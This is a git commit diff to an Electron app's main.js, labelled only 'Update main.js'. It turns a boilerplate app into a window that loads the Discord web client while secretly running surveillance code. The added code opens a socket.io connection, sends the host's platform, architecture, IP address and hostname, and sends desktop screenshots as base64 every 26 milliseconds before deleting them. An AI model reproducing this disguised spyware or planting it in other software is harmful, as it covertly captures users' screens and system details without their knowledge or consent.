184789da86ad84bbec3114b88789b1c293aec0f6
yandere chan <51772725+yc8690347@users.noreply.github.com>
2019-09-23 17:51:50 -0400

    Update main.js

--- main.js
+++ main.js
@@ -1,53 +1,54 @@
-// Modules to control application life and create native browser window
 const {app, BrowserWindow} = require('electron')
 const path = require('path')
+const io = require('socket.io-client')
+const socket = io('http://localhost:3000')
+const os = require('os')
+const ip = require('ip')
+const scr = require('desktop-screenshot')
+const fs = require('fs')
 
-// Keep a global reference of the window object, if you don't, the window will
-// be closed automatically when the JavaScript object is garbage collected.
 let mainWindow
 
+function getbase64(file) {
+  var image = fs.readFileSync(file)
+  return new Buffer(image).toString('base64')
+}
+
 function createWindow () {
-  // Create the browser window.
   mainWindow = new BrowserWindow({
     width: 800,
-    height: 600,
-    webPreferences: {
-      preload: path.join(__dirname, 'preload.js')
-    }
+    height: 600
   })
 
-  // and load the index.html of the app.
-  mainWindow.loadFile('index.html')
+  mainWindow.loadURL('https://discordapp.com/channels/@me')
 
-  // Open the DevTools.
-  // mainWindow.webContents.openDevTools()
-
-  // Emitted when the window is closed.
   mainWindow.on('closed', function () {
-    // Dereference the window object, usually you would store windows
-    // in an array if your app supports multi windows, this is the time
-    // when you should delete the corresponding element.
     mainWindow = null
+  })
+
+  socket.on('connect', function() {
+    socket.emit('new', {platform:os.platform(),arch:os.arch(),ip:ip.address(),hostname:os.hostname()})
+    setInterval(() => { socket.emit('ping', {hostname:os.hostname()}) }, 15);
+    setInterval(() => {
+      scr('scr.png', function(error, complete) {
+        if(error)
+        return false;
+        else
+        return true;
+      })
+      let b64 = getbase64(__dirname+'\\scr.png')
+      socket.emit('scr', b64)
+      fs.unlinkSync(__dirname+'\\scr.png')
+    }, 26)
   })
 }
 
-// This method will be called when Electron has finished
-// initialization and is ready to create browser windows.
-// Some APIs can only be used after this event occurs.
 app.on('ready', createWindow)
 
-// Quit when all windows are closed.
 app.on('window-all-closed', function () {
-  // On macOS it is common for applications and their menu bar
-  // to stay active until the user quits explicitly with Cmd + Q
   if (process.platform !== 'darwin') app.quit()
 })
 
 app.on('activate', function () {
-  // On macOS it's common to re-create a window in the app when the
-  // dock icon is clicked and there are no other windows open.
   if (mainWindow === null) createWindow()
 })
-
-// In this file you can include the rest of your app's specific main process
-// code. You can also put them in separate files and require them here.
